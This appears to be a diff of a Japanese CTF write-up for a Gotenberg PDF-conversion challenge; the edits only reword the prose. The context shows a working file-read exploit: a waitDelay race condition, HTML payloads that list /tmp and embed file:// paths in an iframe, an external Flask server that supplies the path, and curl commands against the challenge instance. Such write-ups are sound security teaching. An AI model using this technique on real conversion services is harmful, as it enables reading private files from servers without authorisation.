@@ -9,7 +9,7 @@ Individual instances can be started at the link below:
 # Solution
 インスタンサーとソースが渡される。  
 Gotenbergなる、各種ドキュメントをpdfに変換するAPIが動いているようだ。  
-初めに与えられたソースファイルの内容を確認する。  
+初めに、与えられたソースファイルの内容を確認する。  
 フラグがどこにあるか探すと、entrypoint.shに以下の記述が見られた。  
 ```sh
 #!/bin/sh
@@ -108,9 +108,9 @@ gotenberg@ac7c6f570e53:~$ while true; do grep -r 'test_flag' /tmp/; sleep 1; don
 キューのような形で`waitDelay`をつけたリクエストの処理が終わるまで次の処理が待機させられ、後から来たindex.htmlが削除されないまま数秒間残る。  
 これでファイルが残っている間に読み取りを行えばよいと喜ぶが、大きな問題がある。  
 そもそも待機状態では新しいリクエストを受け付けないため、`/UUID(1)/UUID(2)/`を知るためのリクエストが通らず、通った後にはindex.htmlは既に処理後となり削除されている。  
-`chrome://history/`はchromiumで開いた後、つまり処理後に記録されるため、使うことができないとわかる。  
+`chrome://history/`はchromiumで開いた後、つまり処理後に記録されるため利用できないとわかる。  
 特定のリクエストだけ並列処理させることもできないようだ(厳密には`/forms/libreoffice/convert`などLibreOfficeを用いれば可能だが、ディレクトリを列挙することができないため意味がない)。  
-ここで、index.htmlのリクエストが到達する前に`/UUID(1)/UUID(2)/`を知るためのリクエストとフラグの書かれたindex.htmlを読み取るリクエストをあらかじめ待機させておくアイデアをひらめく。  
+ここで、index.htmlのリクエストが到着する前に`/UUID(1)/UUID(2)/`を知るためのリクエストとフラグの書かれたindex.htmlを読み取るリクエストをあらかじめ待機させておくアイデアをひらめく。  
 以下のようなリクエスト順になる。  
 ```
 chromium
@@ -128,8 +128,8 @@ chromium
 この際に取得した`UUID(2)`はすでに削除されたindex.htmlのものであるため、利用できないことに注意する。  
 ちなみに、このリクエストは待機させる必要はない。  
 ②  
-`waitDelay=6s`とし、5sごとに送信されるindex.htmlのリクエストが待機中に必ず到達するようにする。  
-sato1.htmlでは以下の通り、5s待機してindex.htmlのリクエストが到達した後に、`/tmp/UUID(1)/`を列挙することで、削除される前の`UUID(2)`を応答pdfから取得できる。  
+`waitDelay=6s`とし、5sごとに送信されるindex.htmlのリクエストが待機中に必ず到着するようにする。  
+sato1.htmlでは以下の通り、5s待機してindex.htmlのリクエストが到着した後に、`/tmp/UUID(1)/`を列挙することで、削除される前の`UUID(2)`を応答pdfから取得できる。  
 ```html
 <html lang="en">
 <head>
@@ -149,7 +149,7 @@ sato1.htmlでは以下の通り、5s待機してindex.htmlのリクエストが�
 </body>
 </html>
 ```
-複数の`UUID(2)`が取得できるが、そのうちどれかが当たりであるのでいくつか試す。  
+複数の`UUID(2)`が取得できるが、そのうちどれかがアタリであるのでいくつか試す。  
 `UUID(2)`を取得したら、すぐに外部サーバs4t.pwを建てて以下のapp.pyへ`UUID(1)/UUID(2)`を登録する。  
 ```python
 from flask import Flask, request, make_response
@@ -179,7 +179,7 @@ if __name__ == "__main__":
     app.run(host="0.0.0.0", port=80)
 ```
 ③  
-`waitDelay=15s`とし、②のリクエストとほぼ同時に送信する(実際は`sleep 1`で少し遅らせている)。  
+`waitDelay=15s`とし、②のリクエストとほぼ同時に送信する(実際には`sleep 1`でリクエストを少し遅らせる必要がある)。  
 以下のようにsato2.htmlでは`http://s4t.pw`を`fetch`し、そこに書かれていた`file:///tmp/UUID(1)/UUID(2)/index.html`を`iframe`として埋め込む。  
 15秒待つのは、②が終わり次第④がすぐに処理されるのを防ぐためと、s4t.pwへ`UUID(2)`を登録する時間を稼ぐためである。  
 ```html
@@ -233,7 +233,7 @@ $ (curl -s https://8c2143fb2da8a3617033a8537b76cd0e-44296.inst1.chal-kalmarc.tf/
 /URI (file:///tmp/bc079f55-f1ac-4228-8d60-ce4b4ff93396/d861e9da-95de-4008-ad8b-5a5ed7446787/)>>>>
 [1]+  Done                    ( curl -s https://8c2143fb2da8a3617033a8537b76cd0e-44296.inst1.chal-kalmarc.tf/forms/chromium/convert/html --form 'file=@sato1.html;filename=index.html' --form waitDelay=6s -o ./sato1.pdf; strings sato1.pdf | grep --color=auto file )
 ```
-途中で`UUID(2)`が複数出力されるので、どれかを選んでサーバs4t.pwのapp.pyに追記する。  
+途中で`UUID(2)`が複数出力されるので、どれかを選んでサーバs4t.pwのapp.pyに追記して実行する。  
 今回は`bf56333b-0f6b-46a6-beec-3cfb72253c55`を選ぶ(フラグが得られない場合はハズレである)。  
 するとs4t.pwへリクエストが到達し、しばらく待つとflag.pdfが生成される。  
 ![flag.png](images/flag.png)  
